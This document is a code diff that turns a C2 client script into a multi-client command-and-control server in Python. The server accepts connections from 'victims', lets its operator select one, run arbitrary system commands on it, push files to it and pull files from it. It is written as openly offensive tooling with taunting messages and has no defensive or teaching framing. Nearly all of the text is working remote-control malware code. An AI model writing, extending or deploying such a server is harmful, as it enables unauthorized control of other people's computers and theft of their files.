@@ -1,165 +1,220 @@
 import socket
-import os
+import threading
 import struct
-import sys
+import os
+import subprocess
 
-class C2Client:
-    def __init__(self, host='127.0.0.1', port=4444):
+class C2Server:
+    def __init__(self, host='0.0.0.0', port=4444):
         self.host = host
         self.port = port
-        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.client.connect((self.host, self.port))
+        self.clients = []  # List of (id, socket, address)
+        self.client_id = 0
+        self.selected_id = None
 
-        # --- Fix 3: Timeouts & Keep-Alive ---
-        self.client.settimeout(30.0)
-        self.client.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.server.bind((self.host, self.port))
+        self.server.listen(5)
+        print(f"[*] C2 Server listening on {self.host}:{self.port} 😈")
+        print("[*] Commands: list, select <id>, exit, or type any system command.")
 
-        print("[*] Connected to C2 Server. Enjoy your suffering! 😈")
+    def handle_client(self, client_socket, addr):
+        self.client_id += 1
+        cid = self.client_id
+        self.clients.append((cid, client_socket, addr))
+        print(f"\n[+] New victim #{cid} connected from {addr}")
 
-    def send_command(self, command):
-        self.client.send(command.encode())
-        try:
-            response = self.client.recv(4096).decode()
-            print(response)
-        except socket.timeout:
-            print("[!] Timeout waiting for response.")
-        return response
+        while True:
+            try:
+                data = client_socket.recv(1024)
+                if not data:
+                    break
+            except:
+                break
 
-    def upload_file(self, file_path):
-        # --- Fix 2: Pre-check file locally ---
-        if not os.path.exists(file_path):
-            print(f"[!] Error: File '{file_path}' not found.")
+        self.clients = [c for c in self.clients if c[0] != cid]
+        print(f"\n[-] Victim #{cid} disconnected.")
+
+    def send_to_victim(self, cid, command):
+        for c in self.clients:
+            if c[0] == cid:
+                sock = c[1]
+                try:
+                    sock.send(command.encode())
+                    return True
+                except:
+                    return False
+        return False
+
+    def recv_from_victim(self, cid, buffer_size=4096):
+        for c in self.clients:
+            if c[0] == cid:
+                try:
+                    return c[1].recv(buffer_size)
+                except:
+                    return b""
+        return b""
+
+    def start(self):
+        accept_thread = threading.Thread(target=self._accept_loop, daemon=True)
+        accept_thread.start()
+
+        while True:
+            cmd = input("C2> ").strip()
+            if not cmd:
+                continue
+
+            if cmd.lower() == "exit":
+                break
+
+            elif cmd.lower() == "list":
+                if not self.clients:
+                    print("[!] No victims connected.")
+                else:
+                    print("Connected victims:")
+                    for cid, _, addr in self.clients:
+                        print(f"  #{cid} - {addr}")
+
+            elif cmd.lower().startswith("select "):
+                try:
+                    self.selected_id = int(cmd.split(" ")[1])
+                    exists = any(c[0] == self.selected_id for c in self.clients)
+                    if exists:
+                        print(f"[*] Now controlling victim #{self.selected_id}")
+                    else:
+                        print(f"[!] Victim #{self.selected_id} not found.")
+                        self.selected_id = None
+                except:
+                    print("[!] Usage: select <id>")
+
+            else:
+                if self.selected_id is None:
+                    print("[!] No victim selected. Use 'list' and 'select <id>' first.")
+                    continue
+
+                if cmd.lower().startswith("upload "):
+                    parts = cmd.split(" ")
+                    if len(parts) < 3:
+                        print("[!] Usage: upload <local_file> <remote_path>")
+                        continue
+                    local_file = parts[1]
+                    remote_path = parts[2]
+                    self.upload_file(self.selected_id, local_file, remote_path)
+                    continue
+
+                elif cmd.lower().startswith("download "):
+                    parts = cmd.split(" ")
+                    if len(parts) < 3:
+                        print("[!] Usage: download <remote_file> <local_path>")
+                        continue
+                    remote_file = parts[1]
+                    local_path = parts[2]
+                    self.download_file(self.selected_id, remote_file, local_path)
+                    continue
+
+                self.execute_command(self.selected_id, cmd)
+
+    def execute_command(self, cid, command):
+        if not self.send_to_victim(cid, command):
+            print("[!] Failed to send command. Victim may be disconnected.")
             return
-        if not os.path.isfile(file_path):
-            print(f"[!] Error: '{file_path}' is a directory.")
+
+        response = self.recv_from_victim(cid)
+        if response:
+            try:
+                print(response.decode(errors='ignore'))
+            except:
+                print(response)
+        else:
+            print("[!] No response or victim disconnected.")
+
+    def upload_file(self, cid, local_path, remote_path):
+        if not os.path.exists(local_path):
+            print(f"[!] Local file {local_path} not found.")
+            return
+        if not os.path.isfile(local_path):
+            print(f"[!] {local_path} is not a file.")
             return
 
-        self.client.send(b"upload")
-        # Wait for server to ask for file path
-        self.client.recv(1024)
-        self.client.send(file_path.encode())
-
-        # Wait for READY from server
-        ready = self.client.recv(1024)
-        if b"READY" not in ready:
-            print(f"[!] Server error: {ready.decode()}")
+        if not self.send_to_victim(cid, f"UPLOAD {remote_path}"):
+            print("[!] Failed to send upload command.")
             return
 
-        file_size = os.path.getsize(file_path)
-        # Send size header (8 bytes, big‑endian)
-        self.client.send(struct.pack('!Q', file_size))
+        ack = self.recv_from_victim(cid)
+        if b"READY" not in ack:
+            print("[!] Victim not ready for upload.")
+            return
 
-        try:
-            with open(file_path, 'rb') as f:
-                sent = 0
-                while sent < file_size:
-                    data = f.read(4096)
-                    if not data:
-                        break
-                    self.client.send(data)
-                    sent += len(data)
+        file_size = os.path.getsize(local_path)
+        sock = None
+        for c in self.clients:
+            if c[0] == cid:
+                sock = c[1]
+                break
+        if not sock:
+            return
 
-            # Wait for final confirmation from server
-            resp = self.client.recv(1024)
-            print(resp.decode())
-        except Exception as e:
-            print(f"[!] Upload error: {str(e)}")
+        sock.send(struct.pack('!Q', file_size))
 
-    def download_file(self, file_path):
-        self.client.send(b"download")
-        # Wait for server to ask for path
-        self.client.recv(1024)
-        self.client.send(file_path.encode())
+        with open(local_path, 'rb') as f:
+            sent = 0
+            while sent < file_size:
+                data = f.read(4096)
+                if not data:
+                    break
+                sock.send(data)
+                sent += len(data)
 
-        # --- Fix 2: Receive size header first ---
-        size_data = self.client.recv(8)
+        print(f"[*] Uploaded {local_path} to victim as {remote_path}")
+
+    def download_file(self, cid, remote_path, local_path):
+        if not self.send_to_victim(cid, f"DOWNLOAD {remote_path}"):
+            print("[!] Failed to send download command.")
+            return
+
+        sock = None
+        for c in self.clients:
+            if c[0] == cid:
+                sock = c[1]
+                break
+        if not sock:
+            return
+
+        size_data = sock.recv(8)
         if len(size_data) < 8:
-            print("[!] Error: Invalid size response.")
+            print("[!] Invalid size header from victim.")
             return
         file_size = struct.unpack('!Q', size_data)[0]
 
         if file_size == 0:
-            # Server sends an error message
-            error_msg = self.client.recv(1024).decode()
-            print(f"[!] Download failed: {error_msg}")
+            error = sock.recv(1024).decode()
+            print(f"[!] Victim error: {error}")
             return
 
-        # --- Fix 2: Write with safe error handling ---
-        try:
-            # Prevent overwriting critical files (optional safety)
-            if os.path.exists(file_path):
-                print(f"[!] File '{file_path}' already exists. Skipping download.")
-                return
-
-            with open(file_path, 'wb') as f:
-                received = 0
-                while received < file_size:
-                    chunk = self.client.recv(min(4096, file_size - received))
-                    if not chunk:
-                        break
-                    f.write(chunk)
-                    received += len(chunk)
-
-            if received == file_size:
-                print(f"[*] File '{file_path}' downloaded successfully. 😈")
-            else:
-                print(f"[!] Download incomplete. Got {received}/{file_size} bytes.")
-                os.remove(file_path)  # clean up partial file
-        except PermissionError:
-            print("[!] Error: Permission denied writing file.")
-        except Exception as e:
-            print(f"[!] Error saving file: {str(e)}")
-
-    def shell(self):
-        self.client.send(b"shell")
-        print("[*] Shell mode activated. Type 'exit' to quit. 🐍")
-        while True:
-            try:
-                cmd = input("shell> ")
-                if cmd.lower() == "exit":
-                    self.client.send(b"exit")
+        with open(local_path, 'wb') as f:
+            received = 0
+            while received < file_size:
+                chunk = sock.recv(min(4096, file_size - received))
+                if not chunk:
                     break
-                self.client.send(cmd.encode())
-                output = self.client.recv(4096).decode()
-                print(output)
-            except socket.timeout:
-                print("[!] Timeout – shell may be hung. Type 'exit' to return.")
-            except KeyboardInterrupt:
-                continue
+                f.write(chunk)
+                received += len(chunk)
+
+        if received == file_size:
+            print(f"[*] Downloaded {remote_path} from victim to {local_path}")
+        else:
+            print(f"[!] Download incomplete. Got {received}/{file_size}")
+
+    def _accept_loop(self):
+        while True:
+            client_socket, addr = self.server.accept()
+            client_socket.settimeout(60.0)
+            client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+            t = threading.Thread(target=self.handle_client, args=(client_socket, addr))
+            t.daemon = True
+            t.start()
 
 if __name__ == "__main__":
-    # --- Fix 1: Accept IP and port from command line ---
-    host = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
-    port = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
-
-    client = C2Client(host=host, port=port)
-
-    while True:
-        try:
-            command = input("C2> ")
-        except (KeyboardInterrupt, EOFError):
-            break
-
-        if command.lower() == "exit":
-            client.send_command("exit")
-            break
-
-        elif command.lower() == "ping":   # --- Heartbeat ---
-            client.send_command("ping")
-
-        elif command.lower() == "shell":
-            client.shell()
-
-        elif command.lower().startswith("upload "):
-            file_path = command.split(" ", 1)[1]
-            client.upload_file(file_path)
-
-        elif command.lower().startswith("download "):
-            file_path = command.split(" ", 1)[1]
-            client.download_file(file_path)
-
-        elif command.lower() == "list":
-            client.send_command("list")
-
-        else:
-            client.send_command(command)
+    server = C2Server()
+    server.start()
